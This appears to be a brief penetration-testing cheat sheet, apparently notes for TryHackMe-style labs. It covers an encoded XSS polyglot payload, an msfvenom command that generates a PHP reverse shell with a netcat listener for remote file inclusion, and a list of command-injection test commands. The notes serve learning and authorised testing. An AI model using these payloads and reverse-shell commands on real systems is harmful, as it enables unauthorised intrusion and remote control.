# XSS
### XSS Hunter
`
https://xsshunter.com/
`
### XSS Polyglot (decode to get actual payload)
`
amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29uZXJyb3I9YWxlcnQoJ1RITScpICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9YWxlcnQoJ1RITScpLy8+XHgzZQ==
`

# RFI
### Shell generation
`msfvenom -p php/reverse_php lport=4444 lhost=<your ip > /path/to/shell`

### Start listen on port
`cd /path/to/shell`

`sudo python3 -m http.server`

`nc -lvp 4444`                 


# Command Injection
Use one of the following commands to test command injection. Or you can use `Burp Suite Intruder` with this [payload](https://github.com/payloadbox/command-injection-payload-list).
### Blind
`ping`

`>` forcing some output && `cat`

`curl` great way

### Verbose
#### Linux
`whoami` || `ls` || `ping` || `sleep` ||  `nc`

#### Windows
`whoami` || `dir` || `ping` || `timeout`
